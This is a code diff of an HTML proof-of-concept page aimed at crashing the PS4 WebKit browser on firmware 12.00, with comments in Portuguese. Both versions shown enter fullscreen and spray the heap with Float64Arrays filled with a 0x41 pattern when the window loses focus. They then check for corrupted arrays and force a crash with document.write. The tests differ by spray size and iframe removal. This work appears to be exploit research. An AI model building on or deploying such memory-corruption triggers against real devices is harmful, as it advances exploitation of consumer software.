@@ -1,65 +1,84 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Webkit (PoC CE-36329-3)</title>
+    <title>PS4 Crash PoC - Isolation</title>
 </head>
 <body>
 
-    <h1>WebKit Memory Corruption - Stability Test</h1>
-    <p>Target: Firmware 12.00 | Researcher: Leandro</p>
-    
-    <div id="msg">
-        INSTRUCTIONS:<br>
-        1. Click a button below to enter Fullscreen.<br>
-        2. Press <b>OPTIONS</b> on the controller.<br>
-        3. The document.write will trigger the crash.
-    </div>
-    
-    <br>
-    <button onclick="fire(1)">RUN TEST 1</button>
-    <button onclick="fire(2)">RUN TEST 2</button>
-    <button onclick="fire(3)">RUN TEST 3</button>
-    <button onclick="fire(4)">RUN TEST 4</button>
-    <button onclick="fire(5)">RUN TEST 5</button>
-    <button onclick="fire(6)">RUN TEST 6</button>
+    <h1>PS4 12.00 - Isolated Crash Tests</h1>
+    <p>Foco: Replicar o comportamento do arquivo original para causar o CE-36329-3.</p>
+
+    <button onclick="runTest(1)">TEST 1 (Original)</button><br><br>
+    <button onclick="runTest(2)">TEST 2 (Spray +2k)</button><br><br>
+    <button onclick="runTest(3)">TEST 3 (Spray +4k)</button><br><br>
+    <button onclick="runTest(4)">TEST 4 (Iframe + Original)</button><br><br>
+    <button onclick="runTest(5)">TEST 5 (Fast Trigger)</button><br><br>
+    <button onclick="runTest(6)">TEST 6 (Max Stability)</button>
+
+    <div id="crash-result"></div>
 
     <script>
-        const Msg = document.getElementById('msg');
-        let spray_storage = [];
-        // O valor que representa 0x4141414141414141 em memória
-        const PATTERN = 2.121995791e-314; 
-
-        function fire(type) {
-            Msg.innerText = "FULLSCREEN ACTIVE - PRESS OPTIONS NOW"; 
-            
-            // Entrada em Fullscreen idêntica ao seu código
-            const doc = document.documentElement;
-            if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-
-            // O GATILHO: Exatamente como você explicou
-            window.onblur = function() {
-                // 1. FREE/CORRUPT
-                // Variamos apenas a intensidade do spray conforme o botão
-                let spray_size = 8000 + (type * 1000); 
-                
-                try {
-                    for(let i = 0; i < spray_size; i++) {
-                        // Replicando o uso do Float64Array que corrompe a memória
-                        const poison = new Float64Array(32);
-                        poison.fill(PATTERN); 
-                        spray_storage.push(poison);
-                    }
-                } catch(e) {}
-                
-                // 2. TEARDOWN (O que causa o crash ao apertar Options)
-                // Usando document.write para interromper o contexto em Fullscreen
-                document.open();
-                document.write("<html><body><h1>CRASHING...</h1></body></html>");
-                document.close();
-            };
+    function runTest(type) {
+        const result = document.getElementById('crash-result');
+        result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
+        
+        let controllers = [];
+        const PATTERN = 2.121995791e-314; // 0x4141414141414141
+        
+        // Setup original dos objetos alvo
+        for(let i = 0; i < 5000; i++) {
+            let arr = new Float64Array(8);
+            arr[0] = i;
+            controllers.push(arr);
         }
+        
+        // Entra em Fullscreen
+        const elem = document.documentElement;
+        if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+        
+        window.onblur = function() {
+            // Variação de intensidade do spray para encontrar o ponto ideal na 12.00
+            let spraySize = 8000;
+            if (type === 2) spraySize = 10000;
+            if (type === 3) spraySize = 12000;
+            if (type === 6) spraySize = 15000;
+
+            let spray = [];
+            for(let i = 0; i < spraySize; i++) {
+                let p = new Float64Array(10);
+                p.fill(PATTERN);
+                spray.push(p);
+            }
+            
+            // Verificação de corrupção idêntica ao seu original
+            let corrupted = null;
+            for(let i = 0; i < controllers.length; i++) {
+                if (controllers[i][0] === PATTERN) {
+                    corrupted = controllers[i];
+                    break;
+                }
+            }
+            
+            // O GATILHO DO CRASH: Sequência document.write original
+            // Removi o setTimeout de 3 segundos para o crash ser imediato no onblur
+            if (corrupted || type >= 4) {
+                if (type === 4) {
+                    // Teste 4: Adiciona a remoção de um iframe antes do write
+                    let ifrm = document.createElement('iframe');
+                    document.body.appendChild(ifrm);
+                    ifrm.remove();
+                }
+
+                document.open();
+                document.write('<html><body><h1>Crash</h1></body></html>');
+                document.close();
+                
+                // O reload final que ajuda a forçar a quebra da pilha de memória
+                setTimeout(() => location.reload(), 10);
+            }
+        };
+    }
     </script>
 </body>
 </html>
